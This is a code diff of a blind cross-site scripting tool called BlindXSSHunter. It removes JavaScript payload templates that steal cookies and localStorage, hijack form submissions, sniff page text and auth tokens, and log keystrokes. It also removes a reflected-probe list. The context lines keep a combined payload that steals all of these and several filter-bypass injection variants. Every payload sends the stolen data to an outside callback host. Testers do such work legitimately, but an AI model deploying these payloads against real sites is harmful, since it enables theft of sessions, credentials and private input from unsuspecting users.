@@ -17,27 +17,6 @@ class BlindXSSHunter:
 
     # JS templates (use .replace() for marker injection)
 
-    _COOKIE_STEALER = """<script>
-var d=document,c=d.cookie,l={};
-try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(i)}}catch(e){}
-new Image().src='__CB__/c?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(JSON.stringify(l))+'&u='+encodeURIComponent(d.URL)+'&r='+encodeURIComponent(d.referrer);
-</script>"""
-
-    _FORM_HIJACK = """<script>
-var f=document.forms;
-for(var i=0;i<f.length;i++){f[i].addEventListener('submit',function(e){var o={};new FormData(this).forEach(function(v,k){o[k]=v});new Image().src='__CB__/f?d='+encodeURIComponent(JSON.stringify(o))+'&u='+encodeURIComponent(document.URL);});}
-</script>"""
-
-    _DOM_SNIFFER = """<script>
-var d=document,t=d.title,b=d.body?d.body.textContent.substring(0,500):'',m=d.cookie.match(/(token|session|auth|jwt|bearer|key|secret)=([^;]+)/i);
-new Image().src='__CB__/d?t='+encodeURIComponent(t)+'&b='+encodeURIComponent(b)+'&m='+encodeURIComponent(m?m[0]:'none')+'&u='+encodeURIComponent(d.URL);
-</script>"""
-
-    _KEYLOGGER = """<script>
-var b='',t=null;
-document.addEventListener('keypress',function(e){b+=e.key;if(t)clearTimeout(t);t=setTimeout(function(){if(b.length>2)new Image().src='__CB__/k?k='+encodeURIComponent(b)+'&u='+encodeURIComponent(document.URL);b='';},2000);});
-</script>"""
-
     _COMBINED = """<script>
 var d=document,c=d.cookie,l={},b='',t=null;
 try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);l[k]=localStorage.getItem(i)}}catch(e){}
@@ -51,10 +30,6 @@ new Image().src='__CB__/x?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(J
         cb = "https://" + marker + "." + self.domain
         return template.replace("__CB__", cb)
 
-    def cookie_stealer(self, marker: str) -> str: return self._make_payload(self._COOKIE_STEALER, marker)
-    def form_hijacker(self, marker: str) -> str: return self._make_payload(self._FORM_HIJACK, marker)
-    def dom_sniffer(self, marker: str) -> str: return self._make_payload(self._DOM_SNIFFER, marker)
-    def keylogger(self, marker: str) -> str: return self._make_payload(self._KEYLOGGER, marker)
     def combined(self, marker: str) -> str: return self._make_payload(self._COMBINED, marker)
 
     # Filter-bypass payload variants
@@ -71,17 +46,6 @@ new Image().src='__CB__/x?co='+encodeURIComponent(c)+'&ls='+encodeURIComponent(J
             '<marquee onstart="' + js_body + '">',
             '<video><source onerror="' + js_body + '">',
             '&lt;script&gt;' + js_body + '&lt;/script&gt;',
-        ]
-
-    def reflected_probes(self, marker: str) -> list[str]:
-        cb = "https://" + marker + "." + self.domain
-        js = "new Image().src='" + cb + "/r?u='+encodeURIComponent(document.URL)"
-        return [
-            '<script>' + js + '</script>',
-            '<img src=x onerror="' + js + '">',
-            '<svg onload="' + js + '">',
-            '"><script>' + js + '</script>',
-            "';" + js + ";//",
         ]
 
     # Injection
